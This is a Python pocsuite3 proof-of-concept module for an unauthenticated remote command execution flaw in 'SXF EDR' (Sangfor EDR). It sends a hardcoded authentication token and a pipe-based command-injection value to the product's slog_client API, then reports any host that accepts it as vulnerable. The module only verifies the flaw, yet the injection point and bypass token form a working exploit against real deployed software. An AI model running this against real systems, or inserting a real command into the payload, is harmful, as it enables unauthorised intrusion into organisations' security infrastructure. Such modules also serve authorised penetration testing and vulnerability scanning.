"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import re
from urllib.parse import urljoin

from pocsuite3.api import Output, POCBase, register_poc, logger, requests


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '3.0'
    author = ['']
    vulDate = '2020-9-4'
    createDate = '2020-9-4'
    updateDate = '2020-9-4'
    references = ['']
    name = 'SXF EDR UNAuth RCE'
    appPowerLink = ''
    appName = 'SXF EDR'
    appVersion = ''
    vulType = 'UNAuth RCE'
    desc = '''
    '''
    samples = []
    install_requires = ['']

    def normalize_url(self):
        schema = self.url.split('://')[0]
        netloc = self.url.split('//')[-1].split('/')[0].split(':')
        if len(netloc) > 1:
            ip, port = netloc
            if '443' in port:
                schema = 'https'
        else:
            ip = netloc[0]
            port = '80' if schema == 'http' else '443'
        return '{0}://{1}:{2}'.format(schema, ip, port)

    def exploit(self, mode):
        result = {}
        url = self.normalize_url()

        resp = requests.get(urljoin(url, '/ui/'))
        match = re.search(r"(\d+\.\d+\.\d+\.\d+)", resp.text)
        version = match.group(0) if match else ""

        url = urljoin(url,
                      "/api/edr/sangforinter/v2/cssp/slog_client?token=eyJyYW5kb20iOiIxIiwgIm1kNSI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIn0=")
        data = r'{"params": "|aaa"}'
        resp = requests.post(url=url, data=data)

        code = resp.json().get("code")
        message = resp.json().get("message")
        if code != -1 and message:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Version'] = version

        return result

    def _verify(self):
        result = {}

        try:
            result = self.exploit(mode='verify')
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
